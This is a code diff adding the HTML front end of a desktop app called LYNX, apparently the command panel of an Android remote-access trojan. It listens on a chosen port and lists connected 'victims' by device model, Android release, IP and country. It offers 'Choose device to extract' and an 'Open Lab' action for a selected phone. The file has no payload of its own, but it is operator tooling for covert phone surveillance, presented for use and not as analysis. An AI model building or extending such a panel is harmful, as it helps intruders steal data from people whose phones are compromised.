@@ -1,0 +1,454 @@
+<!DOCTYPE html>
+<html ng-app="myapp">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=no">
+        <title>LYNX</title>
+        <!-- Insert this line above script imports  -->
+        <script>
+        if (typeof module === 'object') {
+            window.module = module;
+            module = undefined;
+        }
+        </script>
+        <script type="text/javascript" src="assets/js/lib/jquery-3.1.1.min.js"></script>
+        <script type="text/javascript" src="../node_modules/fomantic-ui/dist/semantic.min.js"></script>
+        <script type="text/javascript" src="../node_modules/angular/angular.js"></script>
+        <script type="text/javascript" src="assets/js/controllers/AppCtrl.js"></script>
+        <!-- Insert this line after script imports -->
+        <script>
+        if (window.module) module = window.module;
+        </script>
+        <link rel="stylesheet" href="assets/css/mystyle.css">
+        <link rel="stylesheet" href="../node_modules/fomantic-ui/dist/semantic.min.css">
+        <link href="https://fonts.googleapis.com/css2?family=Inter:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
+        <style>
+        #log {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            height: 200px;
+            width: 100%;
+            background-color: #1b202e;
+            color: #ffffff;
+            overflow-y: auto;
+            overflow-x: hidden;
+            padding: 0px;
+            box-sizing: border-box;
+            z-index: 999;
+        }
+        </style>
+        <style>
+        .tabular.menu .item.active[data-tab="first"] {
+            background-color: #15222b !important;
+            color: white !important;
+            font-weight: bold;
+            border-radius: 6px 6px 0 0;
+        }
+
+        .tabular.menu .item i {
+            margin-right: 8px;
+        }
+        </style>
+        <style>
+        html,
+        body {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            background: #1A1B22;
+            overflow: hidden;
+            font-family: 'Inter';
+        }
+        </style>
+        <style>
+        .port-input:focus-visible {
+            outline: none;
+            border: none;
+        }
+
+        .selected-row {
+            background-color: #337EC9 !important;
+            color: white !important;
+        }
+
+        .selected-row td {
+            color: white !important;
+        }
+
+        tr:hover {
+            background-color: #2a3142 !important;
+        }
+        </style>
+        <script>
+            // Prevent page reload
+            document.addEventListener('submit', function(e) {
+                e.preventDefault();
+                return false;
+            });
+            
+            // Prevent navigation
+            window.addEventListener('popstate', function(e) {
+                e.preventDefault();
+                return false;
+            });
+        </script>
+    </head>
+    <body ng-controller="AppCtrl" class="draggable" style="height: 100vh; width: 100vw; margin: 0; padding: 0; overflow: hidden;">
+        <div style="
+        display: flex; 
+        height: 100vh; 
+        width: 100vw; 
+        gap: 10px;
+        background: #1A1B22; 
+        color: #fff; 
+        justify-content: space-between;
+    ">
+            <!-- Log Panel (Left) -->
+            <div id="log" class="notDraggable" style="
+                position: relative;
+                width: 400px; 
+                color: #fff; 
+                background-color: #FFFFFF00;
+                height: 100vh; 
+                border-top-left-radius: 12px; 
+                border-bottom-left-radius: 12px; 
+                display: grid;
+                align-content: flex-start;
+            ">
+                <div style="display: flex; justify-content:center; align-items: center; gap: 20px; height: 100px; padding: 0px 10px;">
+                    <img src="assets/img/VictimsLab.png" style="
+                width: 55px;
+                height: 62px;
+                    ">
+                    <div style="
+                        font-size: 40px; 
+                        color: #ffffff; 
+                        font-weight: 800;
+                        font-family: 'Inter', sans-serif;
+                    ">LYNX</div>
+                </div>
+                <div style="
+                    margin-bottom: 8px; 
+                    background-color: #202128;
+                    width: 400px;
+                    padding: 20px 10px;
+                    height: calc( 100vh - 120px );
+                    overflow-y: auto; 
+                ">
+                    <div ng-repeat="log in logs" class="log">
+                        <span style="
+                        font-size: 13px; 
+                        color: #a3a3a3; 
+                        font-weight: 500;
+                        font-family: 'Inter', sans-serif;
+                    ">{{log.date}}</span>
+                        <br>
+                        <span style="
+                    font-size: 15px; 
+                    font-weight: 600;
+                    font-family: 'Inter', sans-serif;
+                " ng-style="{'color':log.color}" ng-bind="log.msg"></span>
+                    </div>
+                </div>
+            </div>
+            <!-- Main Content (Center) -->
+            <div style="
+                display: grid; 
+                align-content: flex-start;
+                width: calc(100% - 800px);            
+            ">
+                <!-- Port Input and Buttons -->
+                <div style="height: 100px;"></div>
+                <!-- Statistics Panel -->
+                <!-- <div style="background: #232837; border-radius: 10px; box-shadow: 0 2px 8px rgba(0,0,0,0.08); padding: 15px; margin-bottom: 15px;">
+                    <div style="display: flex; justify-content: space-around; text-align: center;">
+                        <div>
+                            <div style="font-size: 24px; font-weight: bold; color: #337EC9;">{{deviceStats.total || 0}}</div>
+                            <div style="font-size: 12px; color: #a3a3a3;">Total Devices</div>
+                        </div>
+                        <div>
+                            <div style="font-size: 24px; font-weight: bold; color: #21ba45;">{{deviceStats.online || 0}}</div>
+                            <div style="font-size: 12px; color: #a3a3a3;">Online</div>
+                        </div>
+                        <div>
+                            <div style="font-size: 24px; font-weight: bold; color: #fbbd08;">{{deviceStats.withNotes || 0}}</div>
+                            <div style="font-size: 12px; color: #a3a3a3;">With Notes</div>
+                        </div>
+                    </div>
+                </div> -->
+                <!-- Device Table -->
+                <div style="background: #232837; border-radius: 10px; box-shadow: 0 2px 8px rgba(0,0,0,0.08); padding: 18px 12px;  ">
+                    <div style="width: 100%;  display: flex; gap: 12px; margin-bottom: 28px; align-items: center;">
+                        <div style="
+                            height: 44px; 
+                            width: calc(100% - 300px); 
+                            border-radius: 5px; 
+                            background: #ffffff; 
+                            font-family: 'Inter', sans-serif; 
+                            font-weight: 500; 
+                            font-size: 16px; 
+                            line-height: 100%; 
+                            vertical-align: middle; 
+                            border: none;
+                            display: flex;
+                            justify-content: space-between;
+                            align-items: center;
+                            padding-left: 10px;
+                            ">
+                            <svg
+                                width="32"
+                                height="32"
+                                viewBox="0 0 32 32"
+                                fill="none"
+                                xmlns="http://www.w3.org/2000/svg"
+                                xmlns:xlink="http://www.w3.org/1999/xlink"
+                            >
+                                <rect width="32" height="32" fill="url(#pattern0_2_21)"/>
+                                <defs>
+                                    <pattern
+                                        id="pattern0_2_21"
+                                        patternContentUnits="objectBoundingBox"
+                                        width="1"
+                                        height="1"
+                                    >
+                                        <use xlink:href="#image0_2_21" transform="scale(0.01)"/>
+                                    </pattern>
+                                    <image
+                                        id="image0_2_21"
+                                        width="100"
+                                        height="100"
+                                        preserveAspectRatio="none"
+                                        xlink:href="data:image/png;base64,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"
+                                    />
+                                </defs>
+                            </svg>
+                            <input
+                                class="port-input"
+                                style="height: 44px; width: calc(100% - 40px); border-radius: 5px; background: #ffffff; font-family: 'Inter', sans-serif; font-weight: 500; font-size: 16px; line-height: 100%; vertical-align: middle; border: none;"
+                                ng-model="port"
+                                type="text"
+                                maxlength="4"
+                                pattern="\d{4}"
+                                ng-pattern="/^\d{4}$/"
+                                placeholder="Enter port number...."
+                                oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0,4)"
+                            >
+                        </div>
+                        <button ng-click="Listen(port)" style="
+                            color: white; 
+                            width: 140px; 
+                            height: 44px; 
+                            background: #202128; 
+                            border-radius: 6px; 
+                            font-family: 'Inter', sans-serif;
+                            font-weight: 500;
+                            font-style: Medium;
+                            font-size: 16px;
+                            line-height: 100%;
+                            letter-spacing: 0%;
+                            text-align: center;
+                            vertical-align: middle;
+                            border: none; 
+                            cursor: pointer;
+                        ">Listen</button>
+                        <button ng-click="StopListening(port)" style="
+                            color: white; 
+                            width: 140px; 
+                            height: 44px; 
+                            background: #E33B2E; 
+                            border-radius: 6px; 
+                            font-family: 'Inter', sans-serif;
+                            font-weight: 500;
+                            font-style: Medium;
+                            font-size: 16px;
+                            line-height: 100%;
+                            letter-spacing: 0%;
+                            text-align: center;
+                            vertical-align: middle;
+                            border: none; 
+                            cursor: pointer;
+                        ">Stop</button>
+                    </div>
+                    <table class="ui celled striped table selectable" style="width: 100%; background: #232837; color: #fff;">
+                        <thead style="background: #23283700;">
+                            <tr>
+                                <th style="text-align: center; font-size: 17px; font-weight: 600; background-color: #FFFFFF00; border: 1px solid #5E6566; color: #5E6566;">
+                                    Flag
+                                </th>
+                                <th style="text-align: center; font-size: 17px; font-weight: 600; background-color: #FFFFFF00; border: 1px solid #5E6566; color: #5E6566;">
+                                    Manufacturer
+                                </th>
+                                <th style="text-align: center; font-size: 17px; font-weight: 600; background-color: #FFFFFF00; border: 1px solid #5E6566; color: #5E6566;">
+                                    Model
+                                </th>
+                                <th style="text-align: center; font-size: 17px; font-weight: 600; background-color: #FFFFFF00; border: 1px solid #5E6566; color: #5E6566;">
+                                    Release
+                                </th>
+                                <th style="text-align: center; font-size: 17px; font-weight: 600; background-color: #FFFFFF00; border: 1px solid #5E6566; color: #5E6566;">
+                                    IP
+                                </th>
+                                <th style="text-align: center; font-size: 17px; font-weight: 600; background-color: #FFFFFF00; border: 1px solid #5E6566; color: #5E6566;">
+                                    Port
+                                </th>
+                                <th style="text-align: center; font-size: 17px; font-weight: 600; background-color: #FFFFFF00; border: 1px solid #5E6566; color: #5E6566;">
+                                    Note
+                                </th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr
+                                style="background: #23283700; border-radius: 5px; cursor: pointer;"
+                                ng-repeat="(key, victim) in victims"
+                                ng-click="selectVictim(key, victim); $event.stopPropagation();"
+                                ng-class="{'selected-row': selectedVictimKey === key}"
+                            >
+                                <td style="text-align: center; font-size: 17px; font-weight: 600; background-color: #FFFFFF00; border: 1px solid #5E6566; color: #337EC9;">
+                                    <i ng-if="victim.country" class="{{victim.country}} flag"></i>
+                                    <i ng-if="!victim.country" class="vn flag"></i>
+                                </td>
+                                <td style="text-align: center; font-size: 17px; font-weight: 600; background-color: #FFFFFF00; border: 1px solid #5E6566; color: #337EC9;" ng-bind="victim.manf"></td>
+                                <td style="text-align: center; font-size: 17px; font-weight: 600; background-color: #FFFFFF00; border: 1px solid #5E6566; color: #337EC9;" ng-bind="victim.model"></td>
+                                <td style="text-align: center; font-size: 17px; font-weight: 600; background-color: #FFFFFF00; border: 1px solid #5E6566; color: #337EC9;" ng-bind="victim.release"></td>
+                                <td style="text-align: center; font-size: 17px; font-weight: 600; background-color: #FFFFFF00; border: 1px solid #5E6566; color: #337EC9;" ng-bind="victim.ip"></td>
+                                <td style="text-align: center; font-size: 17px; font-weight: 600; background-color: #FFFFFF00; border: 1px solid #5E6566; color: #337EC9;" ng-bind="victim.port"></td>
+                                <td style="text-align: center; font-size: 17px; font-weight: 600; background-color: #FFFFFF00; border: 1px solid #5E6566; color: #337EC9; padding: 5px;">
+                                    <div style="display: flex; align-items: center; justify-content: center; gap: 5px;">
+                                        <span ng-if="!victim.isEditingNote" style="max-width: 150px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;" ng-bind="victim.note || 'No note'"></span>
+                                        <input
+                                            ng-if="victim.isEditingNote"
+                                            ng-model="victim.tempNote"
+                                            style="width: 120px; padding: 2px 5px; border: 1px solid #337EC9; border-radius: 3px; background: #2a3142; color: #fff; font-size: 14px;"
+                                            ng-keyup="$event.keyCode === 13 && saveNote(key, victim)"
+                                            ng-blur="saveNote(key, victim)"
+                                        >
+                                        <button ng-if="!victim.isEditingNote" ng-click="editNote(key, victim, $event)" style="background: none; border: none; color: #337EC9; cursor: pointer; font-size: 12px; padding: 2px 5px;">
+                                            <i class="edit icon"></i>
+                                        </button>
+                                    </div>
+                                </td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+            <!-- Phone Panel (Right) -->
+            <div style="width: 400px; background: #ffffff00; height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; border-top-right-radius: 12px; border-bottom-right-radius: 12px; box-shadow: -2px 0 8px rgba(0,0,0,0.1);">
+                <div style="background: #181c24; border-radius: 32px; width: 270px; height: 540px; display: flex; flex-direction: column; align-items: center; justify-content: center; box-shadow: 0 2px 12px rgba(0,0,0,0.18); border: 6px solid #232837;">
+                    <div style="width: 100%; height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px;">
+                        <!-- Default state when no device is selected -->
+                        <div ng-if="!selectedVictim" style="text-align: center;">
+                            <span style="font-size: 17px; color: #fff; margin-bottom: 18px; display: block;">
+                                Choose device
+                            to extract
+                            </span>
+                            <div style="display: flex; align-items: center; justify-content: center;">
+                                <svg
+                                    width="38"
+                                    height="38"
+                                    viewBox="0 0 50 50"
+                                    style="animation: spin 1s linear infinite;"
+                                    xmlns="http://www.w3.org/2000/svg"
+                                >
+                                    <circle
+                                        cx="25"
+                                        cy="25"
+                                        r="20"
+                                        fill="none"
+                                        stroke="#21ba45"
+                                        stroke-width="6"
+                                        stroke-linecap="round"
+                                        stroke-dasharray="31.415, 31.415"
+                                        transform="rotate(72.0001 25 25)"
+                                    >
+                                        <animateTransform
+                                            attributeName="transform"
+                                            type="rotate"
+                                            from="0 25 25"
+                                            to="360 25 25"
+                                            dur="1s"
+                                            repeatCount="indefinite"
+                                        />
+                                    </circle>
+                                </svg>
+                            </div>
+                        </div>
+                        <!-- Device information when selected -->
+                        <div ng-if="selectedVictim" style="width: 100%; text-align: center;">
+                            <div style="margin-bottom: 20px;">
+                                <i ng-if="selectedVictim.country" class="{{selectedVictim.country}} flag" style="font-size: 24px;"></i>
+                                <i ng-if="!selectedVictim.country" class="vn flag" style="font-size: 24px;"></i>
+                            </div>
+                            <div style="margin-bottom: 15px;">
+                                <div style="font-size: 14px; color: #a3a3a3; margin-bottom: 5px;">Manufacturer</div>
+                                <div style="font-size: 16px; color: #fff; font-weight: 600;">{{selectedVictim.manf}}</div>
+                            </div>
+                            <div style="margin-bottom: 15px;">
+                                <div style="font-size: 14px; color: #a3a3a3; margin-bottom: 5px;">Model</div>
+                                <div style="font-size: 16px; color: #fff; font-weight: 600;">{{selectedVictim.model}}</div>
+                            </div>
+                            <div style="margin-bottom: 15px;">
+                                <div style="font-size: 14px; color: #a3a3a3; margin-bottom: 5px;">Release</div>
+                                <div style="font-size: 16px; color: #fff; font-weight: 600;">
+                                    {{selectedVictim.release}}
+                                </div>
+                            </div>
+                            <div style="margin-bottom: 15px;">
+                                <div style="font-size: 14px; color: #a3a3a3; margin-bottom: 5px;">IP Address</div>
+                                <div style="font-size: 16px; color: #fff; font-weight: 600;">{{selectedVictim.ip}}</div>
+                            </div>
+                            <div style="margin-bottom: 25px;">
+                                <div style="font-size: 14px; color: #a3a3a3; margin-bottom: 5px;">Port</div>
+                                <div style="font-size: 16px; color: #fff; font-weight: 600;">{{selectedVictim.port}}</div>
+                            </div>
+                            <div style="margin-bottom: 25px;">
+                                <div style="font-size: 14px; color: #a3a3a3; margin-bottom: 5px;">Note</div>
+                                <div style="display: flex; align-items: center; gap: 10px;">
+                                    <div style="font-size: 16px; color: #fff; font-weight: 600; flex: 1; word-wrap: break-word; max-width: 200px;">
+                                        {{selectedVictim.note || 'No note'}}
+                                    </div>
+                                    <button ng-click="editSelectedDeviceNote()" style="background: #337EC9; border: none; color: white; padding: 5px 10px; border-radius: 4px; cursor: pointer; font-size: 12px;">
+                                        Edit
+                                    </button>
+                                </div>
+                            </div>
+                            <!-- Action Button -->
+                            <button ng-click="openLab(selectedVictimKey)" style="width: 100%; height: 44px; background: #337EC9; color: white; border: none; border-radius: 8px; font-family: 'Inter', sans-serif; font-weight: 600; font-size: 16px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px;">
+                                <svg
+                                    width="20"
+                                    height="20"
+                                    viewBox="0 0 24 24"
+                                    fill="none"
+                                    xmlns="http://www.w3.org/2000/svg"
+                                >
+                                    <path
+                                        d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z"
+                                        stroke="#FFFFFF"
+                                        stroke-width="2"
+                                        stroke-linecap="round"
+                                        stroke-linejoin="round"
+                                    />
+                                    <path
+                                        d="M12 16L16 12L12 8"
+                                        stroke="#FFFFFF"
+                                        stroke-width="2"
+                                        stroke-linecap="round"
+                                        stroke-linejoin="round"
+                                    />
+                                    <path
+                                        d="M8 12H16"
+                                        stroke="#FFFFFF"
+                                        stroke-width="2"
+                                        stroke-linecap="round"
+                                        stroke-linejoin="round"
+                                    />
+                                </svg>
+                                Open Lab
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </body>
+    <!-- Xóa các phần layout cũ, chỉ giữ lại layout mới 3 cột ngang -->
